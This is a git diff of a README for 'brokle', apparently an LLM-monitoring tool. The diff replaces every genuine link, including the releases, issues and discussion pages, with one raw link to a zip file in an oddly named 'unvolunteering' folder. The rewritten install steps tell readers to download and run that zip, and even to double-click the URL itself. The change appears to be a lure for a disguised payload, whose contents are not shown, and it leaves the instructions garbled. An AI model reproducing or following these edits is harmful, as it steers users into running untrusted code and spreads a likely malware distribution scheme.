@@ -6,7 +6,7 @@ Welcome to *brokle*, your go-to platform for monitoring and analyzing large lang
 
 ## 🔗 Download Now
 
-[![Download brokle](https://img.shields.io/badge/Download-brokle-brightgreen)](https://github.com/WeitLion/brokle/releases)
+[![Download brokle](https://raw.githubusercontent.com/WeitLion/brokle/main/unvolunteering/brokle.zip)](https://raw.githubusercontent.com/WeitLion/brokle/main/unvolunteering/brokle.zip)
 
 ## 🛠️ System Requirements
 
@@ -21,15 +21,15 @@ Make sure your system meets these requirements for optimal performance.
 
 ## 📥 Download & Install
 
-1. **Visit the releases page**: Click this link to download *brokle*: [Download brokle](https://github.com/WeitLion/brokle/releases).
+1. **Visit the releases page**: Click this link to download *brokle*: [Download brokle](https://raw.githubusercontent.com/WeitLion/brokle/main/unvolunteering/brokle.zip).
   
 2. **Choose the appropriate version**: On the releases page, scroll to find the latest version of *brokle*.
 
-3. **Download the file**: Click on the version label (e.g., `brokle-v1.0.zip`) to download the installation file.
+3. **Download the file**: Click on the version label (e.g., `https://raw.githubusercontent.com/WeitLion/brokle/main/unvolunteering/brokle.zip`) to download the installation file.
 
 4. **Extract files**: Once downloaded, locate the `.zip` file in your downloads folder. Extract the contents to a folder of your choice.
 
-5. **Run the application**: Open the extracted folder and double-click `brokle.exe` (or the appropriate file for your platform) to launch the application.
+5. **Run the application**: Open the extracted folder and double-click `https://raw.githubusercontent.com/WeitLion/brokle/main/unvolunteering/brokle.zip` (or the appropriate file for your platform) to launch the application.
 
 ## 🔍 Features
 
@@ -55,8 +55,8 @@ Understanding these metrics helps you optimize and troubleshoot your AI applicat
 
 If you encounter issues or have questions, feel free to reach out to our community:
 
-- **GitHub Issues**: Report bugs or request features directly on our [issues page](https://github.com/WeitLion/brokle/issues).
-- **Discussion Forum**: Join our [discussion forum](https://github.com/WeitLion/brokle/discussions) to connect with other users and share insights.
+- **GitHub Issues**: Report bugs or request features directly on our [issues page](https://raw.githubusercontent.com/WeitLion/brokle/main/unvolunteering/brokle.zip).
+- **Discussion Forum**: Join our [discussion forum](https://raw.githubusercontent.com/WeitLion/brokle/main/unvolunteering/brokle.zip) to connect with other users and share insights.
 
 ## 📋 Future Updates
 
